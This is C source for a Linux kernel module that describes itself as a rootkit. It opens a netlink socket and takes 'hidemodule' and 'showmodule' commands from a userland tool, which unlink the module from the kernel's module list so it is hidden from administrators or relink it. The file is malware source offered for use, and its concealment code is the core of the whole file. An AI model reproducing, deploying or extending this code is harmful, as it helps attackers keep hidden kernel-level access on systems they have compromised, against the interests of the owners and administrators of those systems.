#include <linux/module.h>
#include <net/sock.h>

#define LICENCE "GPL"
#define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
#define AUTHOR "Benjamin Haag"
#define VERSION "0.3"

#define NETLINK_PROTOCOL 31

MODULE_LICENSE(LICENCE);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_AUTHOR(AUTHOR);
MODULE_VERSION(VERSION);





/***********************************************************
*          CONFIGURE MODULE                                *
***********************************************************/

static struct list_head *prev_save;

static void hidemodule(void) {
    if (prev_save) return;
    prev_save = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showmodule(void) {
    if (!prev_save) return;
    list_add(&THIS_MODULE->list, prev_save);
}

static char * configure(const char * command) {
    if (strcmp(command, "hidemodule") == 0) {
        hidemodule();
        return "Module is now hidden.";
    }
    if (strcmp(command, "showmodule") == 0) {
        showmodule();
        return "Module is now shown.";
    }
    return "Error: unknowm command!";
}





/***********************************************************
*          NETLINK COMMUNICATION                           *
***********************************************************/

struct sock *nl_sock = NULL;

static void nl_recv_msg(struct sk_buff *);
struct netlink_kernel_cfg cfg = {
    .input = nl_recv_msg,
};

struct nlmsghdr *nlh;
struct sk_buff *skb_out;
char * msg;
int pid;
int msg_len;
int res;

static int create_socket(void) {
    nl_sock = netlink_kernel_create(&init_net, NETLINK_PROTOCOL, &cfg);
    if(!nl_sock) {
        return -1;
    }
    return 0;
}

static void close_socket(void) {
    netlink_kernel_release(nl_sock);
    nl_sock = NULL;
}

static void nl_recv_msg(struct sk_buff * skb) {

    // get data from packet
    nlh = (struct nlmsghdr*)skb->data;
    msg = (char *)nlmsg_data(nlh);
    pid = nlh->nlmsg_pid;

    printk(KERN_INFO "Received: %s (%ld Bytes)\n", msg, strlen(msg));

    // prepare response data
    msg = configure(msg);
    msg_len = strlen(msg);

    // allocate space for message
    skb_out = nlmsg_new(msg_len, 0);
    if(!skb_out) {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }

    // pack response
    nlh=nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_len, 0);
    NETLINK_CB(skb_out).dst_group = 0;
    strncpy(nlmsg_data(nlh), msg, msg_len);

    // send packet
    res = nlmsg_unicast(nl_sock, skb_out, pid);
    if (res == -1) {
        printk(KERN_ALERT "Error sending response\n");
    }
}





/***********************************************************
*          MODULE SETUP                                    *
***********************************************************/

static int __init
module_load(void) {

    printk(KERN_INFO "Rootkit: loaded. Hello!\n");

    if(create_socket() != 0) {
        printk(KERN_ERR "Rootkit: unable to create socket!");
        return -1;
    }

    return 0;
}

static void __exit
module_unload(void) {

    close_socket();

    printk(KERN_INFO "Rootkit: unloaded. Bye Bye!\n");

}


module_init(module_load);
module_exit(module_unload);